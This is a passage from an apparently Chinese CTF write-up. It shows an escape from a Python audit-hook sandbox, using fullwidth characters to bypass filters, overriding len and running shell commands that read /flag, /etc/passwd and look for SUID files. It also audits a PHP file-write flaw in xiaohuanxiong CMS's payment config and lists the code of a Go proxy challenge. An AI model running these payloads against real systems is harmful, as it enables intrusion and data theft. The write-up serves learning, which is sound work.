class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure>
<p>​		这个情况感觉很像是沙箱了，不允许执行某些特定的函数，</p>
<p>这段代码定义了一个名为  <code>my_audit_hook</code>  的函数，并将其设置为 Python 解释器的审计钩子（audit hook）。审计钩子是一种机制，允许开发者在 Python 执行特定事件时插入自定义的检查或行为。这个功能在 Python 3.8 中被引入，主要用于安全目的，比如监控和限制某些潜在危险的操作。</p>
<blockquote>
<p>让我们逐步解析这段代码：</p>
<ol>
<li>
<p>函数定义</p>
<p>：</p>
<ul>
<li><code>def my_audit_hook(event_name, arg):</code> ：定义了一个名为  <code>my_audit_hook</code>  的函数，它接受两个参数： <code>event_name</code>  和  <code>arg</code> 。 <code>event_name</code>  是一个字符串，表示触发审计的事件名称； <code>arg</code>  是与该事件相关的附加信息，其类型和结构取决于具体的事件。</li>
</ul>
</li>
<li>
<p>黑名单</p>
<p>：</p>
<ul>
<li><code>blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</code> ：定义了一个名为  <code>blacklist</code>  的列表，包含了一系列不希望被执行的函数或操作的名称。这些操作通常因为安全性原因而被认为是高风险的。</li>
</ul>
</li>
<li>
<p>事件名称长度检查</p>
<p>：</p>
<ul>
<li><code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code> ：这行代码检查  <code>event_name</code>  的长度是否超过 4 个字符。如果是，则抛出  <code>RuntimeError</code>  异常，异常信息为 “Too Long!”。这个检查看起来是随意设置的，因为事件名称的长度通常与安全性无直接关联。</li>
</ul>
</li>
<li>
<p>黑名单检查</p>
<p>：</p>
<ul>
<li>循环遍历  <code>blacklist</code>  列表，检查  <code>event_name</code>  中是否包含列表中的任何字符串。如果包含，则抛出  <code>RuntimeError</code>  异常，异常信息为 “No!”。这个检查旨在阻止执行黑名单中列出的高风险操作。</li>
</ul>
</li>
<li>
<p>设置审计钩子</p>
<p>：</p>
<ul>
<li><code>__import__('sys').addaudithook(my_audit_hook)</code> ：这行代码首先动态导入  <code>sys</code>  模块（尽管通常直接导入  <code>sys</code>  模块更为常见），然后调用  <code>sys.addaudithook</code>  方法，将  <code>my_audit_hook</code>  函数设置为审计钩子。这意味着每当 Python 解释器执行一个审计事件时， <code>my_audit_hook</code>  函数都会被调用。</li>
</ul>
</li>
</ol>
<p><strong>注意</strong>：</p>
<ul>
<li>审计钩子是一个强大的特性，应该谨慎使用。不当的审计钩子设置可能会阻止合法的操作，导致程序无法正常运行。</li>
<li>在实际生产环境中，对审计钩子的使用应该基于详细的安全分析和风险评估。</li>
</ul>
<p>- 此代码示例中的长度检查和黑名单可能需要根据实际的安全需求进行调整。</p>
</blockquote>
<p>​		看上去像是一个沙箱，将代码写入文件，然后运行，捕获输出，需要逃逸：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI2NDc/dGltZV9fMTMxMT1HcUd4dURSaVlpd3hscnpHN0R5R0RjR3Zmb1k1UW1vM3gjdG9jLTM0">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGDcGvfoY5Qmo3x#toc-34</span> 绕过 audit hook</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):  </span><br><span class="line">    <span class="comment"># 定义了一个名为do的函数，它接受一个参数source_code，这个参数预期是一个包含Python源代码的字符串。  </span></span><br><span class="line">  </span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):  </span></span><br><span class="line"><span class="string">    # 定义了一个审计钩子函数my_audit_hook，它接受两个参数：event_name和arg。  </span></span><br><span class="line"><span class="string">    # 这个函数会在Python的审计事件发生时被调用。  </span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]  </span></span><br><span class="line"><span class="string">    # 定义了一个黑名单列表，包含了一些可能被认为是不安全的函数名。  </span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:  </span></span><br><span class="line"><span class="string">        # 检查事件名称的长度是否超过4个字符。  </span></span><br><span class="line"><span class="string">        # 注意：这个检查可能并不直接与安全相关，它可能是一个示例或占位符。  </span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)  </span></span><br><span class="line"><span class="string">    # 如果事件名称太长，则抛出运行时错误。  </span></span><br><span class="line"><span class="string">    for bad in blacklist:  </span></span><br><span class="line"><span class="string">        # 遍历黑名单列表。  </span></span><br><span class="line"><span class="string">        if bad in event_name:  </span></span><br><span class="line"><span class="string">            # 检查事件名称是否包含黑名单中的任何字符串。  </span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)  </span></span><br><span class="line"><span class="string">    # 如果事件名称包含黑名单中的字符串，则抛出运行时错误。  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)  </span></span><br><span class="line"><span class="string"># 使用__import__函数动态导入sys模块，并调用其addaudithook方法注册审计钩子函数。  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="comment"># 多行字符串结束，此时hook_code变量包含了上述审计钩子函数的定义和注册代码。  </span></span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(source_code)  </span><br><span class="line">    <span class="comment"># 打印传入的源代码字符串，这在调试时可能有用，但在生产环境中可能泄露敏感信息。  </span></span><br><span class="line">  </span><br><span class="line">    code = hook_code + source_code  </span><br><span class="line">    <span class="comment"># 将审计钩子代码和传入的源代码拼接在一起，形成一个完整的Python脚本。  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 注意：下面这行代码实际上并没有在后续逻辑中使用tree变量。  </span></span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)  </span><br><span class="line">    <span class="comment"># 使用compile函数尝试将源代码编译为字节码，但实际上由于指定了ast.PyCF_ONLY_AST标志，  </span></span><br><span class="line">    <span class="comment"># 这行代码会返回一个AST（抽象语法树）对象而不是字节码。然而，这个AST对象并没有被后续代码使用。  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="comment"># 尝试执行以下代码块。  </span></span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="comment"># 调用一个名为verify_secure的函数，传入之前编译得到的AST对象（尽管这个对象并没有真正被使用）。  </span></span><br><span class="line">            <span class="comment"># 注意：verify_secure函数没有在代码中定义，因此这段代码在实际运行时会抛出NameError。  </span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                <span class="comment"># 打开（或创建）一个名为run.py的文件，并准备写入内容。  </span></span><br><span class="line">                f.write(code)  </span><br><span class="line">            <span class="comment"># 将之前拼接好的代码写入run.py文件。  </span></span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">            <span class="comment"># 使用subprocess模块运行run.py脚本，捕获其标准输出，并尝试将输出解码为UTF-8字符串。  </span></span><br><span class="line">            <span class="comment"># 这里还设置了一个5秒的超时时间。  </span></span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">            <span class="comment"># 删除run.py文件，清理执行环境。  </span></span><br><span class="line">            <span class="keyword">return</span> result  </span><br><span class="line">        <span class="comment"># 如果verify_secure函数返回True（表示代码被认为是安全的），则执行上述代码块并返回执行结果。  </span></span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># 如果代码被认为是不安全的，则返回一条消息表示执行被中止。  </span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span>  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        <span class="comment"># 捕获所有异常（这是一个不推荐的做法，因为它会捕获包括编程错误在内的所有异常）。  </span></span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">        <span class="comment"># 无论发生什么异常，都尝试删除run.py文件。  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span>  </span><br><span class="line">    <span class="comment"># 如果发生异常，则返回一条可能误导的消息（&quot;Timeout!&quot;），即使异常的原因可能并不是超时。</span></span><br></pre></td></tr></table></figure>
<p>​		大概就这些了，先做个测试吧，半角形式似乎能绕过符号正则匹配：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;languageVersion&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;TEXT&quot;</span><span class="punctuation">:</span><span class="string">&quot;＇；ｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂）．ｒｅａｄ（））＃&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		根据上面的绕过沙箱方式，这里可以让 len 永久性小于 1，就是重写内置函数 len，构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br></pre></td></tr></table></figure>
<p>​		之后就是读 flag 了：<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZGQvJUVGJUJDJThDJUU5JTlDJTgwJUU4JUE2JTgxJUU3JTk0JUE4JUU1JTg4JUIwJUU4JUJGJTk5JUU0JUI4JUFBJUVGJUJDJThDJUU0JUI4JThEJUU4JUJGJTg3JUU0JUI4JThEJUU3JTlGJUE1JUU5JTgxJTkzJUU1JTg1JUI3JUU0JUJEJTkzJUU1JThFJTlGJUU3JTkwJTg2JUVGJUJDJThDJUU0JUJDJUIwJUU2JTkxJUI4JUU3JTlEJTgwJUU1JUJBJTk0JUU4JUFGJUE1JUU2JTk4JUFGJUU2JThGJTkwJUU2JTlEJTgzJUVGJUJDJThDJUU2JUFGJTk1JUU3JUFCJTlGJUU2JUIyJTk5JUU3JUFFJUIxJUU1JThGJUFGJUU4JTgzJUJEJUU2JUIyJUExJUU2JTlDJTg5JUU2JTlEJTgzJUU5JTk5JTkwJUVGJUJDJTg4JUU3JThDJTlDJUU3JTlBJTg0JUVGJUJDJThDJUU1JThGJUFGJUU4JTgzJUJEJUU0JUI4JThEJUU1JUFGJUI5JUVGJUJDJTg5JUUzJTgwJTgy">https://gtfobins.github.io/gtfobins/dd/，需要用到这个，不过不知道具体原理，估摸着应该是提权，毕竟沙箱可能没有权限（猜的，可能不对）。</span></p>
<p>​		payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br><span class="line"><span class="string">print(len(&quot;aaaaaa&quot;))</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>ls<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>LFILE=file_to_read dd <span class="keyword">if</span>=/flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>find / -user root -perm -<span class="number">4000</span> -<span class="built_in">print</span> <span class="number">2</span>&gt;/dev/null<span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#改为半角，加上\n：</span></span><br><span class="line"><span class="string">＇；＿＿ｉｍｐｏｒｔ＿＿（＇ｓｙｓ＇）．ｍｏｄｕｌｅｓ［＇＿＿ｍａｉｎ＿＿＇］．＿＿ｄｉｃｔ＿＿［＇＿＿ｂｕｉｌｔｉｎｓ＿＿＇］．＿＿ｄｉｃｔ＿＿［＇ｌｅｎ＇］ ＝ ｌａｍｂｄａ ｘ： １\nｐｒｉｎｔ（ｌｅｎ（＂ａａａａａａ＂））\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ｌｓ＇）\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ＬＦＩＬＥ＝ｆｉｌｅ＿ｔｏ＿ｒｅａｄ ｄｄ ｉｆ＝／ｆｌａｇ＇）\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ｆｉｎｄ ／ －ｕｓｅｒ ｒｏｏｔ －ｐｅｒｍ －４０００ －ｐｒｉｎｔ ２＞／ｄｅｖ／ｎｕｌｌ＇）＃</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h2 id="xiaohuanxiong"><a class="markdownIt-Anchor" href="#xiaohuanxiong">#</a> xiaohuanxiong：</h2>
<p>​		项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcmthYmxlL3hpYW9odWFueGlvbmc=">https://github.com/forkable/xiaohuanxiong</span></p>
<p>​		开始审计：</p>
<p>​		存在 admin 文件夹，那估计洞可能在 admin 里面，先看里面：</p>
<ol>
<li>Admins 有创建、管理、删除管理员用户的功能，推测可能会有洞，但实际上并没有用到这里。</li>
<li>Areas、Authors、Banners、BaseAdmin、Books、Chapters 一直到 Login 都没啥用，就正常的管理系统</li>
</ol>
<p>​		当看到 Payment 的时候，发现了一个重要的点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//支付配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>()) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;json&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;保存成功&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;json&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		保存配置文件，存在文件写入的问题，写入的还是 php 文件，之后进入 admin/payment 看看，发现了这些：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/5d7af358c0c44f88a3533e0b7ad15c01.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		这里面写入 payload 即可：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/fe6bfe2f95e64d48ad701b6676f12492.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		<img data-src="https://i-blog.csdnimg.cn/direct/fbe689cea973480aa83b960ff34ec977.png#pic_center" alt="在这里插入图片描述"></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2db4c362-5f6f-4c81-b77e-d27ec7fcb6aa&#125;</span><br></pre></td></tr></table></figure>
<h2 id="proxy"><a class="markdownIt-Anchor" href="#proxy">#</a> proxy：</h2>
<p>​		这段代码定义了一个使用 Gin 框架的 Go Web 服务器，它提供了两个 API 接口，分别位于  <code>/v1/api/flag</code>  和  <code>/v2/api/proxy</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">	Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">	FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">			flag, err := cmd.CombinedOutput()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			<span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line">			<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			client := &amp;http.Client&#123;</span><br><span class="line">				CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">				req.Header.Set(key, value)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">			body, err := io.ReadAll(resp.Body)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Status(resp.StatusCode)</span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">				c.Header(key, value[<span class="number">0</span>])</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Writer.Write(body)</span><br><span class="line">			c.Abort()</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		先看看 /v1/api/flag：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">			flag, err := cmd.CombinedOutput()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	